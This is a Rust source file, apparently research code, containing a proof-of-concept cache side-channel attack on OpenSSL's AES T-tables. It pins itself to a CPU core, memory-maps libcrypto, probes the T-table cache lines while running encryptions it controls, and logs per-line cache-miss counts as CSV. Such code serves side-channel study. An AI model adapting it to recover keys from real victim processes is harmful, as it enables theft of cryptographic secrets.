//#![feature(specialization)]
#![feature(unsafe_block_in_unsafe_fn)]
#![deny(unsafe_op_in_unsafe_fn)]

use openssl::aes;

use crate::CacheStatus::Miss;
use cache_side_channel::table_side_channel::TableCacheSideChannel;
use cache_side_channel::{restore_affinity, set_affinity, CacheStatus, ChannelHandle};
use memmap2::Mmap;
use openssl::aes::aes_ige;
use openssl::symm::Mode;
use rand::seq::SliceRandom;
use rand::thread_rng;
use std::collections::HashMap;
use std::fs::File;
use std::path::Path;

// Generic AES T-table attack flow

// Modularisation :
// The module handles loading, then passes the relevant target infos to a attack strategy object for calibration
// Then the module runs the attack, calling the attack strategy to make a measurement and return hit/miss

// interface for attack : run victim (eat a closure)
// interface for measure : give measurement target.

// Can attack strategies return err ?

// Load a vulnerable openssl - determine adresses af the T tables ?
// Run the calibrations
// Then start the attacks

// This is a serialized attack - either single threaded or synchronised

// parameters required

// an attacker measurement
// a calibration victim

// Access Driven

// TODO

pub struct AESTTableParams<'a> {
    pub num_encryptions: u32,
    pub key: [u8; 32],
    pub openssl_path: &'a Path,
    pub te: [isize; 4],
}

const KEY_BYTE_TO_ATTACK: usize = 0;

/// # Safety
///
/// te need to refer to the correct t tables offset in the openssl library at path.
pub unsafe fn attack_t_tables_poc<T: ChannelHandle>(
    side_channel: &mut impl TableCacheSideChannel<T>,
    parameters: AESTTableParams,
    name: &str,
) {
    let old_affinity = set_affinity(&side_channel.main_core());

    // Note : This function doesn't handle the case where the address space is not shared. (Additionally you have the issue of complicated eviction sets due to complex addressing)
    // TODO

    // Possible enhancements : use ability to monitor several addresses simultaneously.
    let fd = File::open(parameters.openssl_path).unwrap();
    let mmap = unsafe { Mmap::map(&fd).unwrap() };
    let base = mmap.as_ptr();

    let te0 = unsafe { base.offset(parameters.te[0]) };
    if unsafe { (te0 as *const u64).read() } != 0xf87c7c84c66363a5 {
        panic!("Hmm This does not look like a T-table, check your address and the openssl used\nUse `nm libcrypto.so.1.0.0 | \"grep Te[0-4]\"`")
    }

    let key_struct = aes::AesKey::new_encrypt(&parameters.key).unwrap();

    let mut timings: HashMap<*const u8, HashMap<u8, u32>> = HashMap::new();

    let mut addresses: Vec<*const u8> = parameters
        .te
        .iter()
        .map(|&start| ((start)..(start + 64 * 16)).step_by(64))
        .flatten()
        .map(|offset| unsafe { base.offset(offset) })
        .collect();

    addresses.shuffle(&mut thread_rng());

    let mut victims_handle = unsafe { side_channel.calibrate(addresses.clone()).unwrap() };

    for addr in addresses.iter() {
        let mut timing = HashMap::new();
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            timing.insert(b, 0);
        }
        timings.insert(*addr, timing);
    }

    let mut victim_handles_ref = victims_handle.iter_mut().collect();

    for b in (u8::min_value()..=u8::max_value()).step_by(16) {
        eprintln!("Probing with b = {:x}", b);
        // fixme magic numbers

        let victim = || {
            let mut plaintext = [0u8; 16];
            plaintext[KEY_BYTE_TO_ATTACK] = b;
            for byte in plaintext.iter_mut().skip(1) {
                *byte = rand::random();
            }
            let mut iv = [0u8; 32];
            let mut result = [0u8; 16];
            aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
        };

        let r = unsafe {
            side_channel.attack(&mut victim_handles_ref, &victim, parameters.num_encryptions)
        };
        match r {
            Ok(v) => {
                for table_attack_result in v {
                    *timings
                        .get_mut(&table_attack_result.addr)
                        .unwrap()
                        .entry(b)
                        .or_insert(0) += table_attack_result.get(Miss);
                }
            }
            Err(_) => panic!("Attack failed"),
        }
    }
    addresses.sort();

    for probe in addresses.iter() {
        print!("{:p}", probe);
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            print!(" {:4}", timings[probe][&b]);
        }
        println!();
    }

    for probe in addresses {
        for b in (u8::min_value()..=u8::max_value()).step_by(16) {
            println!("CSV:{},{:p},{},{}", name, probe, b, timings[&probe][&b]);
        }
    }

    restore_affinity(&old_affinity);
}
